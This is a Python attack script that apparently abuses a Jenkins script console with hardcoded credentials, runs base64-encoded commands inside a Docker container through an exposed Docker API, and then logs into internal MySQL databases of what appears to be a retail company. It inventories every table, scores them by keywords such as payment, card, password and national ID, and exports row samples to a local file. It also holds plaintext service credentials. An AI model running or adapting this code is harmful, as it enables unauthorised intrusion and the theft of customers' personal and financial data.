#!/usr/bin/env python3
"""
dev_sears_db_inventory.py — DEV Sears MySQL Full Exploration
Via Jenkins RCE → Docker exec (container 5b32e909c295) → MySQL at 172.27.141.6:3308

Fases:
  1) Inventario completo de todas las tablas (6 DBs) con conteo de filas
  2) Análisis de columnas de fecha y dato más reciente por tabla
  3) Sample de 50 registros de tablas de alto valor
  4) Guardar JSON + ranking
"""
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar
import sys, time, re, os

sys.stdout.reconfigure(errors='replace')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH   = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE   = 'https://jenkins-ng.dev.claroshop.com'
DOCKER = 'http://172.27.140.148:4243'
CID    = '5b32e909c295'

# DEV Sears DB
DB_HOST = '172.27.141.6'
DB_PORT = 3308
DB_USER = 'apifincadodev'
DB_PASS = '1q2w3e4r5t6y'
DBS     = ['admonplaza', 'contadores_pot', 'reporte_directivo',
           'reps_mesa_regalo', 'tienda', 'tienda_nueva']

OUT_DIR = r'c:\xampp\htdocs\pentagi\claroshop_attack'


# ─────────────────────────────────────────────────────────────────────────────
# Jenkins helper
# ─────────────────────────────────────────────────────────────────────────────
def jenkins_exec(script, timeout=300):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data  = urllib.parse.urlencode({'script': script}).encode()
    req2  = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH,
                 crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=timeout).read().decode(errors='replace')


def b64enc(s: str) -> str:
    return base64.b64encode(s.encode('utf-8')).decode()


# ─────────────────────────────────────────────────────────────────────────────
# Docker exec helper — PHP script base64-encoded, runs inside container
# ─────────────────────────────────────────────────────────────────────────────
GROOVY_TMPL = r"""
import groovy.json.JsonSlurper

def DOCKER = "http://172.27.140.148:4243"
def CID    = "5b32e909c295"
def B64CMD = "__B64__"

// Create exec
def createBody = '{"Cmd":["bash","-c","echo ' + B64CMD + ' | base64 -d | bash"],"AttachStdout":true,"AttachStderr":true}'
def createResp = ["bash", "-c",
    "curl -s -X POST ${DOCKER}/containers/${CID}/exec " +
    "-H 'Content-Type: application/json' -d '" + createBody + "'"].execute().text
println "=== CREATE RESP ==="
println createResp

def execId
try {
    execId = new JsonSlurper().parseText(createResp).Id
} catch (e) {
    def m = createResp =~ /"Id":"([^"]+)"/
    execId = m ? m[0][1] : "FAIL"
}
println "=== EXEC_ID: " + execId + " ==="

if (execId && execId != "FAIL") {
    def startBody = '{"Detach":false,"Tty":true}'
    def proc = ["bash", "-c",
        "curl -s -X POST ${DOCKER}/exec/${execId}/start " +
        "-H 'Content-Type: application/json' -d '" + startBody + "'"].execute()
    def out = proc.in.text
    println "=== OUTPUT_START ==="
    println out
    println "=== OUTPUT_END ==="
} else {
    println "EXEC_FAILED"
}
"""


def docker_php(php_code: str, label: str = "", timeout: int = 300) -> str:
    """Run php -r code inside the PHP container via Jenkins Groovy."""
    bash_cmd = f"echo {b64enc(php_code)} | base64 -d | php"
    groovy   = GROOVY_TMPL.replace('__B64__', b64enc(bash_cmd))
    print(f"\n{'='*70}")
    print(f">>> {label}  [{time.strftime('%H:%M:%S')}]")
    print(f"{'='*70}")
    try:
        out = jenkins_exec(groovy, timeout=timeout)
    except Exception as e:
        out = f"ERROR: {e}"
    print(out[:4000])
    sys.stdout.flush()
    # Extract content between OUTPUT_START / OUTPUT_END
    m = re.search(r'=== OUTPUT_START ===(.*?)=== OUTPUT_END ===', out, re.DOTALL)
    return m.group(1).strip() if m else out


# ─────────────────────────────────────────────────────────────────────────────
# PHP scripts
# ─────────────────────────────────────────────────────────────────────────────

PHP_INVENTORY = r"""<?php
error_reporting(0);
$host = '172.27.141.6'; $port = 3308; $user = 'apifincadodev'; $pass = '1q2w3e4r5t6y';
$dbs = ['admonplaza','contadores_pot','reporte_directivo','reps_mesa_regalo','tienda','tienda_nueva'];
try {
    $pdo = new PDO("mysql:host=$host;port=$port;dbname=information_schema", $user, $pass,
                   [PDO::ATTR_TIMEOUT=>15, PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
    foreach ($dbs as $db) {
        echo "===DB_START:$db===\n";
        $stmt = $pdo->query(
            "SELECT TABLE_NAME, COALESCE(TABLE_ROWS,0) as ROWS,
                    COALESCE(DATA_LENGTH+INDEX_LENGTH,0) as BYTES,
                    COALESCE(CREATE_TIME,'') as CREATE_TIME,
                    COALESCE(UPDATE_TIME,'') as UPDATE_TIME,
                    COALESCE(TABLE_COMMENT,'') as COMMENT
             FROM information_schema.TABLES
             WHERE TABLE_SCHEMA='$db' ORDER BY TABLE_ROWS DESC");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rows as $r) {
            echo $r['TABLE_NAME']."\t".$r['ROWS']."\t".$r['BYTES']."\t"
                .$r['CREATE_TIME']."\t".$r['UPDATE_TIME']."\t".$r['COMMENT']."\n";
        }
        echo "===DB_END:$db===\n";
    }
} catch (Exception $e) { echo "PDO_ERROR:".$e->getMessage()."\n"; }
"""


PHP_DATE_COLS = r"""<?php
error_reporting(0);
$host = '172.27.141.6'; $port = 3308; $user = 'apifincadodev'; $pass = '1q2w3e4r5t6y';
$dbs = ['admonplaza','contadores_pot','reporte_directivo','reps_mesa_regalo','tienda','tienda_nueva'];
try {
    $pdo = new PDO("mysql:host=$host;port=$port;dbname=information_schema", $user, $pass,
                   [PDO::ATTR_TIMEOUT=>15, PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
    foreach ($dbs as $db) {
        echo "===DB:$db===\n";
        $stmt = $pdo->query(
            "SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE
             FROM information_schema.COLUMNS
             WHERE TABLE_SCHEMA='$db'
               AND (LOWER(COLUMN_NAME) REGEXP 'fecha|date|created|updated|modified|_at|_time|alta|baja|registro|modif')
             ORDER BY TABLE_NAME, COLUMN_NAME");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rows as $r) {
            echo $r['TABLE_NAME']."\t".$r['COLUMN_NAME']."\t".$r['DATA_TYPE']."\n";
        }
    }
} catch (Exception $e) { echo "PDO_ERROR:".$e->getMessage()."\n"; }
"""


# High-value tables to check for recent data (agosto 2026) —
# will be populated after Phase 1 analysis
def php_max_dates(table_pairs):
    """table_pairs = list of (db, table, date_col)"""
    lines = []
    for db, tbl, col in table_pairs[:80]:  # cap at 80 to avoid timeout
        lines.append(
            f"try {{ $r=$pdo->query(\"SELECT COUNT(*) as cnt, MAX(`{col}`) as max_dt "
            f"FROM `{db}`.`{tbl}`\"); $row=$r->fetch(PDO::FETCH_ASSOC); "
            f"echo \"MAXDATE\\t{db}\\t{tbl}\\t{col}\\t\".$row['cnt'].\"\\t\".$row['max_dt'].\"\\n\"; "
            f"}} catch (Exception $e) {{ echo \"ERR\\t{db}\\t{tbl}\\t{col}\\t\".$e->getMessage().\"\\n\"; }}"
        )
    body = "\n".join(lines)
    return f"""<?php
error_reporting(0);
$host='172.27.141.6'; $port=3308; $user='apifincadodev'; $pass='1q2w3e4r5t6y';
try {{
    $pdo = new PDO("mysql:host=$host;port=$port", $user, $pass,
                   [PDO::ATTR_TIMEOUT=>15, PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
    {body}
}} catch (Exception $e) {{ echo "PDO_ERROR:".$e->getMessage()."\\n"; }}
"""


def php_sample_table(db, table, limit=50, extra_where=""):
    return f"""<?php
error_reporting(0);
$host='172.27.141.6'; $port=3308; $user='apifincadodev'; $pass='1q2w3e4r5t6y';
try {{
    $pdo = new PDO("mysql:host=$host;port=$port;dbname={db}", $user, $pass,
                   [PDO::ATTR_TIMEOUT=>30, PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
    $cnt = $pdo->query("SELECT COUNT(*) FROM `{table}`")->fetchColumn();
    echo "COUNT\\t{db}\\t{table}\\t".$cnt."\\n";
    // Describe table
    $desc = $pdo->query("DESCRIBE `{table}`");
    echo "===SCHEMA:{db}.{table}===\\n";
    foreach ($desc->fetchAll(PDO::FETCH_ASSOC) as $r) {{
        echo $r['Field']."\\t".$r['Type']."\\t".$r['Key']."\\t".$r['Default']."\\n";
    }}
    echo "===SAMPLE:{db}.{table}===\\n";
    $stmt = $pdo->query("SELECT * FROM `{table}` {extra_where} ORDER BY 1 DESC LIMIT {limit}");
    $cols = null;
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {{
        if (!$cols) {{ $cols = array_keys($row); echo implode("\\t",$cols)."\\n"; }}
        echo implode("\\t", array_map(function($v){{return str_replace(["\\t","\\n"],["  "," "],$v??"NULL");}}, $row))."\\n";
    }}
}} catch (Exception $e) {{ echo "ERROR:".$e->getMessage()."\\n"; }}
"""


# ─────────────────────────────────────────────────────────────────────────────
# Parsers
# ─────────────────────────────────────────────────────────────────────────────
def parse_inventory(raw: str) -> dict:
    result = {}
    current_db = None
    for line in raw.splitlines():
        line = line.strip()
        m = re.match(r'===DB_START:(\w+)===', line)
        if m:
            current_db = m.group(1)
            result[current_db] = []
            continue
        if re.match(r'===DB_END:', line):
            current_db = None
            continue
        if current_db and line and not line.startswith('PDO_ERROR'):
            parts = line.split('\t')
            if len(parts) >= 2:
                result[current_db].append({
                    'table':       parts[0],
                    'rows':        int(parts[1]) if parts[1].isdigit() else 0,
                    'bytes':       int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0,
                    'create_time': parts[3] if len(parts) > 3 else '',
                    'update_time': parts[4] if len(parts) > 4 else '',
                    'comment':     parts[5] if len(parts) > 5 else '',
                })
    return result


def parse_date_cols(raw: str) -> dict:
    """Returns {db: [(table, col, dtype)]}"""
    result = {}
    current_db = None
    for line in raw.splitlines():
        line = line.strip()
        m = re.match(r'===DB:(\w+)===', line)
        if m:
            current_db = m.group(1)
            result.setdefault(current_db, [])
            continue
        if current_db and line and not line.startswith('PDO_ERROR'):
            parts = line.split('\t')
            if len(parts) >= 2:
                result[current_db].append((parts[0], parts[1], parts[2] if len(parts) > 2 else ''))
    return result


def parse_max_dates(raw: str) -> list:
    rows = []
    for line in raw.splitlines():
        if line.startswith('MAXDATE\t'):
            p = line.split('\t')
            if len(p) >= 6:
                rows.append({'db': p[1], 'table': p[2], 'col': p[3], 'count': p[4], 'max_date': p[5]})
        elif line.startswith('ERR\t'):
            p = line.split('\t')
            if len(p) >= 4:
                rows.append({'db': p[1], 'table': p[2], 'col': p[3], 'count': 'ERR', 'max_date': p[4] if len(p) > 4 else ''})
    return rows


def is_august_2026(date_str: str) -> bool:
    if not date_str:
        return False
    return bool(re.search(r'2026-08', date_str))


def is_recent_2026(date_str: str) -> bool:
    if not date_str:
        return False
    return bool(re.search(r'2026', date_str))


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    master = {
        'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S'),
        'target': f'{DB_HOST}:{DB_PORT} user={DB_USER}',
        'databases': {},
        'date_columns': {},
        'max_dates': [],
        'august_2026_tables': [],
        'high_value_tables': [],
        'samples': {},
        'ranking': []
    }

    # ─── ROUND 1: INVENTARIO COMPLETO ────────────────────────────────────────
    print("\n" + "█"*70)
    print("█  ROUND 1 — Inventario completo de tablas (6 DBs)")
    print("█"*70)
    raw1 = docker_php(PHP_INVENTORY, "ROUND1: Table inventory", timeout=300)
    inventory = parse_inventory(raw1)
    master['databases'] = inventory

    print("\n\n=== INVENTARIO PARSEADO ===")
    total_tables = 0
    for db, tables in inventory.items():
        total_tables += len(tables)
        total_rows = sum(t['rows'] for t in tables)
        print(f"\n  DB: {db} — {len(tables)} tablas, ~{total_rows:,} filas totales")
        for t in tables[:30]:
            flag = " ◄ AGOSTO" if is_august_2026(t['update_time']) else ""
            flag += " ◄ 2026" if not flag and is_recent_2026(t['update_time']) else ""
            print(f"    {t['table']:50s}  {t['rows']:>10,}  upd={t['update_time']}{flag}")

    # ─── ROUND 2: COLUMNAS DE FECHA ──────────────────────────────────────────
    print("\n" + "█"*70)
    print("█  ROUND 2 — Columnas de fecha en todas las DBs")
    print("█"*70)
    raw2 = docker_php(PHP_DATE_COLS, "ROUND2: Date columns", timeout=240)
    date_cols = parse_date_cols(raw2)
    master['date_columns'] = {k: [list(v2) for v2 in v] for k, v in date_cols.items()}

    # Build list of (db, table, col) for max-date queries
    # Prioritize tables with many rows
    table_row_map = {}
    for db, tables in inventory.items():
        for t in tables:
            table_row_map[(db, t['table'])] = t['rows']

    date_candidates = []
    seen = set()
    for db, cols in date_cols.items():
        for (tbl, col, dtype) in cols:
            key = (db, tbl)
            if key not in seen:
                seen.add(key)
                date_candidates.append((db, tbl, col))

    # Sort by row count descending
    date_candidates.sort(key=lambda x: table_row_map.get((x[0], x[1]), 0), reverse=True)
    print(f"\n  Found {len(date_candidates)} (db, table) pairs with date columns")

    # ─── ROUND 3: MAX DATES ──────────────────────────────────────────────────
    print("\n" + "█"*70)
    print("█  ROUND 3 — MAX(fecha) para tablas con columnas de fecha (top 80)")
    print("█"*70)
    if date_candidates:
        php3 = php_max_dates(date_candidates[:80])
        raw3 = docker_php(php3, "ROUND3: Max dates", timeout=360)
        max_dates = parse_max_dates(raw3)
        master['max_dates'] = max_dates

        aug_tables = [r for r in max_dates if is_august_2026(r['max_date'])]
        rec_tables = [r for r in max_dates if is_recent_2026(r['max_date'])]

        master['august_2026_tables'] = aug_tables
        print(f"\n  ◆ Tablas con datos de AGOSTO 2026: {len(aug_tables)}")
        for r in aug_tables:
            print(f"    {r['db']}.{r['table']} [{r['col']}] — {r['count']} rows — max: {r['max_date']}")
        print(f"\n  ◆ Tablas con datos de 2026 (cualquier mes): {len(rec_tables)}")
        for r in rec_tables:
            print(f"    {r['db']}.{r['table']} [{r['col']}] — {r['count']} rows — max: {r['max_date']}")
    else:
        print("  No date candidates found")
        rec_tables = []
        aug_tables = []

    # ─── IDENTIFICAR TABLAS DE ALTO VALOR ────────────────────────────────────
    HIGH_VALUE_KEYWORDS = re.compile(
        r'pedido|order|client|customer|pago|payment|card|tarjet|wallet|moneder'
        r'|token|cuenta|cuenta_|venta|sale|product|precio|price|gift|voucher'
        r'|usuario|user|mesa_regalo|regal|report|reporte|kpi|financi|factur'
        r'|transaccion|transaction|saldo|balance|direccion|address|rfc|curp'
        r'|email|correo|telefon|celular|contrasena|password|hash|credencial',
        re.IGNORECASE
    )
    high_value = []
    for db, tables in inventory.items():
        for t in tables:
            score = 0
            if HIGH_VALUE_KEYWORDS.search(t['table']):
                score += 3
            if t['rows'] > 10000:
                score += 2
            elif t['rows'] > 1000:
                score += 1
            # boost if has recent data
            recent_hit = next((r for r in rec_tables if r['db'] == db and r['table'] == t['table']), None)
            if recent_hit:
                score += 5
                if is_august_2026(recent_hit.get('max_date', '')):
                    score += 3
            if score > 0:
                high_value.append({
                    'db': db,
                    'table': t['table'],
                    'rows': t['rows'],
                    'score': score,
                    'update_time': t['update_time'],
                    'recent': bool(recent_hit),
                    'max_date': recent_hit['max_date'] if recent_hit else ''
                })

    high_value.sort(key=lambda x: (-x['score'], -x['rows']))
    master['high_value_tables'] = high_value
    master['ranking'] = high_value[:30]

    print("\n\n═══ RANKING ALTO VALOR (top 30) ═══")
    print(f"{'#':>3}  {'DB':20s}  {'TABLE':40s}  {'ROWS':>10}  {'SCORE':>5}  MAX_DATE")
    for i, r in enumerate(high_value[:30], 1):
        flag = " ◄◄ AGOSTO 2026" if is_august_2026(r['max_date']) else (" ◄ 2026" if r['recent'] else "")
        print(f"{i:>3}  {r['db']:20s}  {r['table']:40s}  {r['rows']:>10,}  {r['score']:>5}  {r['max_date']}{flag}")

    # ─── ROUND 4: SAMPLES DE TOP 10 TABLAS DE ALTO VALOR ────────────────────
    print("\n" + "█"*70)
    print("█  ROUND 4 — Samples de top 10 tablas de alto valor")
    print("█"*70)
    for i, hv in enumerate(high_value[:10]):
        db, tbl = hv['db'], hv['table']
        print(f"\n  [{i+1}/10] Sampling {db}.{tbl}  (score={hv['score']}, rows={hv['rows']:,})")
        php_s = php_sample_table(db, tbl, limit=50)
        raw_s = docker_php(php_s, f"SAMPLE: {db}.{tbl}", timeout=120)
        master['samples'][f"{db}.{tbl}"] = {'raw': raw_s, 'rows_sampled': 50}

    # ─── GUARDAR ─────────────────────────────────────────────────────────────
    out_path = os.path.join(OUT_DIR, 'dev_sears_all_dbs_inventory.json')
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(master, f, indent=2, ensure_ascii=False, default=str)
    print(f"\n\n✅  Guardado en: {out_path}")
    print(f"    DBs exploradas:      {len(master['databases'])}")
    print(f"    Total tablas:        {total_tables}")
    print(f"    Tablas agosto 2026:  {len(master['august_2026_tables'])}")
    print(f"    Tablas de alto valor: {len(high_value)}")
    print(f"    Samples extraídos:   {len(master['samples'])}")

    # ─── SUMMARY TABLE ───────────────────────────────────────────────────────
    print("\n\n" + "═"*70)
    print("RESUMEN EJECUTIVO — DEV Sears DB Inventory")
    print("═"*70)
    for db, tables in master['databases'].items():
        if not tables:
            print(f"\n  {db}: VACÍA o sin acceso")
            continue
        total = sum(t['rows'] for t in tables)
        aug_flag = " ★ DATOS AGOSTO 2026" if any(
            is_august_2026(r['max_date'])
            for r in master['august_2026_tables'] if r['db'] == db
        ) else ""
        print(f"\n  {db}: {len(tables)} tablas, {total:,} filas{aug_flag}")
        for t in tables[:15]:
            print(f"    {t['table']:50s}  {t['rows']:>10,}")

    print("\n[DONE]")


if __name__ == '__main__':
    main()
